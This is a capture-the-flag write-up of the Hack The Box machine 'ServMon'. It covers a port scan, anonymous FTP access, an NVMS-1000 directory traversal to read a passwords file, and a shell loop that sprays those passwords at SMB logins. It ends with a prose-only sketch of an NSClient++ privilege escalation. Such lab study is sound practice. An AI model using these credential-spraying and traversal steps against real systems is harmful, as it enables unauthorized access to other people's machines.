---
title: HTB - ServMon Write-up
author: bigb0ss
date: 2020-11-23 23:25:00 +0800
categories: [Hack The Box, Windows, Easy]
tags: [hackthebox, servmon, ]
image: /assets/img/post/htb/servmon/01_infocard.png
---

This one was an easy-difficulty Windows box. Good learning path for:
* 


# Initial Recon

## Nmap

Let’s begin with an initial port scan:

```console
$ nmap -Pn --open -sC -sV -p- 10.10.10.184

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  11:05AM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp    open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5666/tcp  open  tcpwrapped
6063/tcp  open  x11?
6699/tcp  open  napster?
7680/tcp  open  pando-pub?
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|_    Location: /index.html
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC

Host script results:
|_clock-skew: 5m04s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-24T04:50:05
|_  start_date: N/A
```

### Interesting Ports to Note

* FTP (21/TCP) - FTP service & Anonymous login allowed
* HTTP (80/TCP) - NVMS-1000 login page

![image](/assets/img/post/htb/servmon/02.png)

* SMB (445/TCP) - No anonymous access allowed

```console
root@kali:~/Documents/htb/box/servmon# smbmap -H 10.10.10.184
[!] Authentication error on 10.10.10.184

root@kali:~/Documents/htb/box/servmon# smbclient -N -L //10.10.10.184
session setup failed: NT_STATUS_ACCESS_DENIED
```

* HTTPS (8443/TCP) - NSClient++ Page

![image](/assets/img/post/htb/servmon/03.png)


# Initial Foothold

## Anonymous FTP

The FTP was allowing the `anonmyous` login. Under the `Users` directory, we can find two files: `Confidential.txt`, `Notes to do.txt`

```console
ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.

ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  11:05AM       <DIR>          Users
226 Transfer complete.

ftp> cd Users
250 CWD command successful.

ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  11:06AM       <DIR>          Nadine
01-18-20  11:08AM       <DIR>          Nathan
226 Transfer complete.

ftp> cd Nadine
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  11:08AM                  174 Confidential.txt
226 Transfer complete.

ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
174 bytes received in 0.08 secs (2.1471 kB/s)

ftp> cd ..
250 CWD command successful.
ftp> cd Nathan
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  11:10AM                  186 Notes to do.txt
226 Transfer complete.

ftp> get Notes\ to\ do.txt
local: to remote: 'Notes
200 PORT command successful.
550 The system cannot find the file specified.
```

The `Confidential.txt` file shows that Nadine left Nathan's `Password.txt` on Nathan's Desktop.

```console
$ cat Confidential.txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

And the `Notes to do.txt` contains some to-do steps. 

```console
$ cat Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

## NVMS-1000 Directory Traversal Vulnerability

Further Google search found that `NVMS-1000` is vulnerable to a directory traversal. It can be found [here](https://www.exploit-db.com/exploits/48311). Using `Burp`, we can confirm that the host is vulnerable: 

![image](/assets/img/post/htb/servmon/04.png)

Leveraging this vulnerability, we can view the `/Users/Nathan/Desktop/Passwords.txt` file.

![image](/assets/img/post/htb/servmon/045png)


## SMB Password Guessing

Since the passwords were found from the `nathan`'s desktop, we can try to bruteforce them against his account. But it did not find the correct password.

```console
$while read i; do echo "[INFO] Password: $i" && smbclient.py servmon/nathan:$i@10.10.10.184; done < pass.txt 

[INFO] Password: 1nsp3ctTh3Way2Mars!
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[INFO] Password: Th3r34r3To0M4nyTrait0r5!
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[INFO] Password: B3WithM30r4ga1n5tMe
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[INFO] Password: L1k3B1gBut7s@W0rk
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[INFO] Password: 0nly7h3y0unGWi11F0l10w
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[INFO] Password: IfH3s4b0Utg0t0H1sH0me
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[INFO] Password: Gr4etN3w5w17hMySk1Pa5$
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
```

Next, we can try it against `nadine` user account. And it found the correct password `L1k3B1gBut7s@W0rk`.

```console
$ while read i; do echo "[INFO] Password: $i" && smbclient.py servmon/nadine:$i@10.10.10.184; done < pass.txt 

[INFO] Password: 1nsp3ctTh3Way2Mars!
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[INFO] Password: Th3r34r3To0M4nyTrait0r5!
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[INFO] Password: B3WithM30r4ga1n5tMe
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[INFO] Password: L1k3B1gBut7s@W0rk
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

Type help for list of commands
```

## SSH Login

Using that credentials, we can ssh into the box and read the `user.txt` flag.

<b>user.txt</b>

```console
Microsoft Windows [Version 10.0.18363.752]          
(c) 2019 Microsoft Corporation. All rights reserved.
                                                    
nadine@SERVMON C:\Users\Nadine>cd desktop           

nadine@SERVMON C:\Users\Nadine\Desktop>dir
 Volume in drive C has no label.                  
 Volume Serial Number is 728C-D22C                
                                                  
 Directory of C:\Users\Nadine\Desktop             
                                                  
08/04/2020  21:28    <DIR>          .             
08/04/2020  21:28    <DIR>          ..            
24/11/2020  04:43                34 user.txt      
               1 File(s)             34 bytes     
               2 Dir(s)  27,726,118,912 bytes free
                                                  
nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
190d ***REDACTED*** ec7f
```


# Privilege Escalation

## Nadine --> SYSTEM (NSClient++ Privilege Escalation)

There is a public privilege escalation for NSClient++. It can be found [here](https://www.exploit-db.com/exploits/46802). In a nutshell, a low privileged user can read the web admin password for NSClient++ from its configuration file. Within the web, due to a lack of restrictions, a user can create a scheduled script to run and NSClient++ is usually running as a Local SYSTEM. Abusing this, one can escalate its privilege to SYSTEM. 







Thanks for reading!

